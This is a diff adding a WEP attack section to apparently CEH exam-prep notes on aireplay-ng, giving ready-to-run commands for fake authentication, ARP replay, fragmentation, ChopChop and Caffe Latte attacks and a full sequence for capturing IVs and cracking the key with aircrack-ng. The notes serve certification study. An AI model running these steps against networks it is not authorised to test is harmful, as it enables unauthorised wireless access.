@@ -55,6 +55,60 @@ sudo aireplay-ng -3 -b <BSSID> -h <myMAC> wlan0mon
 
 ---
 
+## 🧪 WEP attack deep-dive (classic CEH topic)
+
+Even though WEP is dead in the real world, the exam still asks about the attack *mechanics*. Learn the sequence cold.
+
+### 1. Fake authentication (`--fakeauth` / `-1`)
+Associate your card with the AP so the AP accepts your injected frames.
+```bash
+# Syntax: aireplay-ng -1 <reassoc-timing> -a <BSSID> -h <myMAC> <iface>
+sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
+# 0 = one-time auth; use a positive int (e.g. 6000) to periodically re-auth
+```
+Must succeed first — every subsequent WEP attack depends on being associated.
+
+### 2. ARP request replay (`--arpreplay` / `-3`)
+Captures an ARP request and replays it *thousands* of times/sec to generate fresh IVs fast.
+```bash
+sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
+```
+Goal: accumulate ~20k-80k IVs in airodump, then feed to `aircrack-ng`.
+
+### 3. Fragmentation attack (`--fragment` / `-5`)
+Recovers the PRGA (keystream) by abusing fragmentation — doesn't need an ARP in the air.
+```bash
+sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
+# Output: xxxx.xor + xxxx.cap — feed the .xor keystream to packetforge-ng to craft ARPs
+```
+
+### 4. ChopChop attack (`--chopchop` / `-4`)
+Alternative to fragmentation when fragmentation is blocked; trims one byte at a time from an encrypted packet until the AP reveals the keystream.
+```bash
+sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
+```
+
+### 5. Caffe Latte (`-6`) — client-side WEP
+When you can't reach the AP but a client has a cached WEP key, stand up a fake AP and let the client ARP itself into giving up IVs.
+```bash
+sudo aireplay-ng -6 -e CORP-WEP -h 00:11:22:33:44:55 wlan0mon
+```
+
+### WEP full attack sequence (memorize)
+```bash
+# Terminal 1 — capture IVs
+sudo airodump-ng -c 6 --bssid <BSSID> -w wepcap wlan0mon
+
+# Terminal 2
+sudo aireplay-ng -1 0 -a <BSSID> -h <myMAC> wlan0mon      # fake auth
+sudo aireplay-ng -3 -b <BSSID> -h <myMAC> wlan0mon        # ARP replay → IVs fly
+
+# Terminal 3 — when IVs > ~20,000
+aircrack-ng wepcap-01.cap
+```
+
+---
+
 ## ⚠️ Gotchas
 
 - **Monitor mode required** — [airmon-ng](airmon-ng.md) first.
